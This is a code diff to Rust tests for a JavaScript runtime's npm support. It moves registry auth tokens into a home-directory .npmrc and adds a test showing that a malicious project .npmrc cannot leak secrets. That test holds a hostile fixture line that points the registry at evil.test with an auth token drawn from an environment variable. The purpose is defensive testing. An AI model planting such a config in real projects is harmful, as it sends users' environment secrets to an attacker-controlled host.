@@ -792,7 +792,7 @@ mod mock_registry_tests {
     use std::sync::{Arc, Mutex};
 
     use vaeljs_core::test_support::TestRemoteResponse;
-    use vaeljs_core::{RemoteOptions, Runtime, RuntimeOptions};
+    use vaeljs_core::{NpmOptions, RemoteOptions, Runtime, RuntimeOptions};
     use vaeljs_npm::Lockfile;
 
     #[derive(Clone, Default)]
@@ -1130,10 +1130,16 @@ if (plugTag !== "plug+host-1") throw new Error("sibling peer failed");
             }
         };
 
+        let home = TempDir::new().unwrap();
+        write_file(
+            home.path(),
+            ".npmrc",
+            "//private.registry.test/org/:_authToken=vael_priv_tok_42\n",
+        );
         write_file(
             project.path(),
             ".npmrc",
-            "@private:registry=https://private.registry.test/org/\n//private.registry.test/org/:_authToken=vael_priv_tok_42\n",
+            "@private:registry=https://private.registry.test/org/\n",
         );
         write_file(
             project.path(),
@@ -1150,23 +1156,29 @@ if (secretMessage("v8") !== "private:v8") throw new Error("unexpected result");
         );
 
         // Default no-remote mode must NEVER hit network even with .npmrc present.
-        let no_remote_err =
-            Runtime::with_options(RuntimeOptions::new().with_npm_cache_dir(cache.path()))
-                .unwrap()
-                .run_file(&main)
-                .expect_err("no-remote mode must fail closed without network");
+        let no_remote_err = Runtime::with_options(
+            RuntimeOptions::new().with_npm(
+                NpmOptions::new()
+                    .with_cache_dir(cache.path())
+                    .with_npmrc_home_dir(home.path()),
+            ),
+        )
+        .unwrap()
+        .run_file(&main)
+        .expect_err("no-remote mode must fail closed without network");
         assert!(
             no_remote_err.to_string().contains("--allow-remote"),
             "{no_remote_err}"
         );
 
-        // Live remote run with mock transport routes @private/pkg to custom HTTPS registry with Bearer auth.
-        let opts =
-            RuntimeOptions::new().with_remote(RemoteOptions::new().with_cache_dir(cache.path()));
+        // Live remote run with mock transport routes @private/pkg to custom HTTPS registry with Bearer auth from ~/.npmrc.
+        let opts = RuntimeOptions::new()
+            .with_remote(RemoteOptions::new().with_cache_dir(cache.path()))
+            .with_npm(NpmOptions::new().with_npmrc_home_dir(home.path()));
         Runtime::with_options_and_auth_transport(opts, auth_transport.clone())
             .unwrap()
             .run_file(&main)
-            .expect("private scoped package loads into V8 via .npmrc");
+            .expect("private scoped package loads into V8 via ~/.npmrc + project .npmrc routing");
 
         assert!(!project.path().join("node_modules").exists());
         let recorded = seen.lock().unwrap().clone();
@@ -1192,14 +1204,65 @@ if (secretMessage("v8") !== "private:v8") throw new Error("unexpected result");
         Runtime::with_options_and_auth_transport(
             RuntimeOptions::new()
                 .with_remote(RemoteOptions::new().with_cache_dir(cache.path()))
-                .with_offline(true)
-                .with_frozen_lockfile(true),
+                .with_npm(
+                    NpmOptions::new()
+                        .with_offline(true)
+                        .with_frozen_lockfile(true)
+                        .with_npmrc_home_dir(home.path()),
+                ),
             auth_transport,
         )
         .unwrap()
         .run_file(&main)
         .expect("offline frozen run succeeds without network");
         assert_eq!(seen.lock().unwrap().len(), count_before);
+    }
+
+    #[test]
+    fn malicious_repo_npmrc_cannot_exfiltrate_env_secret_in_v8() {
+        let project = TempDir::new().unwrap();
+        let home = TempDir::new().unwrap();
+        let cache = TempDir::new().unwrap();
+
+        write_file(
+            project.path(),
+            ".npmrc",
+            "registry=https://evil.test/\n//evil.test/:_authToken=${PATH}\n",
+        );
+        let main = write_file(
+            project.path(),
+            "main.js",
+            r#"import "npm:evil-pkg@^1.0.0";"#,
+        );
+
+        let hits = Arc::new(Mutex::new(Vec::<String>::new()));
+        let hits_ref = Arc::clone(&hits);
+        let opts = RuntimeOptions::new()
+            .with_remote(RemoteOptions::new().with_cache_dir(cache.path()))
+            .with_npm(NpmOptions::new().with_npmrc_home_dir(home.path()));
+        let err = Runtime::with_options_and_auth_transport(
+            opts,
+            move |url, _timeout, _inm, _ims, _auth| {
+                hits_ref.lock().unwrap().push(url.to_owned());
+                Ok(TestRemoteResponse {
+                    status: 404,
+                    body: b"nope".to_vec(),
+                    ..Default::default()
+                })
+            },
+        )
+        .unwrap()
+        .run_file(&main)
+        .expect_err("malicious repo .npmrc auth/env directive must fail closed");
+        assert!(
+            hits.lock().unwrap().is_empty(),
+            "evil.test must never be contacted: {:?}",
+            hits.lock().unwrap()
+        );
+        assert!(
+            err.to_string().contains("project .npmrc"),
+            "unexpected error: {err}"
+        );
     }
 }
 
